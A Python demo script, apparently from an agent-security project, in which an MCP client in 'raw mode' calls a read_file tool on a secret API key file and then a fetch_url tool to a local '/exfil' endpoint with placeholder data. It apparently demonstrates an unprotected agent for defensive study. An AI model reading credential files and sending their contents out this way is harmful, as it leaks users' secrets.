# examples/mcp_baf_tools/demo_raw_agent.py

import asyncio
from contextlib import AsyncExitStack
from pathlib import Path
from typing import Any, Dict

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client
from mcp import types as mcp_types

SERVER_PATH = Path(__file__).with_name("server.py")


class RawMCPClient:
    def __init__(self) -> None:
        self.exit_stack = AsyncExitStack()
        self.session: ClientSession | None = None

    async def connect(self) -> None:
        server_params = StdioServerParameters(
            command="python",
            args=[str(SERVER_PATH)],
        )

        read, write = await self.exit_stack.enter_async_context(
            stdio_client(server_params)
        )
        self.session = await self.exit_stack.enter_async_context(
            ClientSession(read, write)
        )

        await self.session.initialize()

        response = await self.session.list_tools()
        tool_names = [tool.name for tool in response.tools]
        print("Connected to MCP server with tools:", tool_names)

    async def close(self) -> None:
        await self.exit_stack.aclose()

    async def call_tool(self, name: str, args: Dict[str, Any]) -> str:
        assert self.session is not None, "Session not initialized"

        # For mcp 1.26.0, the method is call_tool(name=..., arguments=...)
        result: mcp_types.CallToolResult = await self.session.call_tool(
            name=name,
            arguments=args,
        )

        if not result.content:
            return ""
        first = result.content[0]
        if isinstance(first, mcp_types.TextContent):
            return first.text
        return str(first)


async def main() -> None:
    client = RawMCPClient()
    await client.connect()

    secret_path = "/Users/poovaragamukeshkumar/Documents/GitHub/baf-agent/examples/exam_helper_v1/data/secrets/secret_api_key.txt"
    print("\n[RAW AGENT] Calling read_file on secret path (raw mode)...")
    secret_content = await client.call_tool(
        "read_file",
        {"path": secret_path, "mode": "raw"},
    )
    print("[RAW AGENT] read_file result (truncated):", secret_content[:80], "...")

    exfil_url = "http://127.0.0.1:8000/exfil"
    print(f"\n[RAW AGENT] Calling fetch_url to {exfil_url} ...")
    exfil_result = await client.call_tool(
        "fetch_url",
        {
            "url": exfil_url,
            "data": "exfiltrated data placeholder",
        },
    )
    print("[RAW AGENT] fetch_url result:", exfil_result)

    await client.close()


if __name__ == "__main__":
    asyncio.run(main())
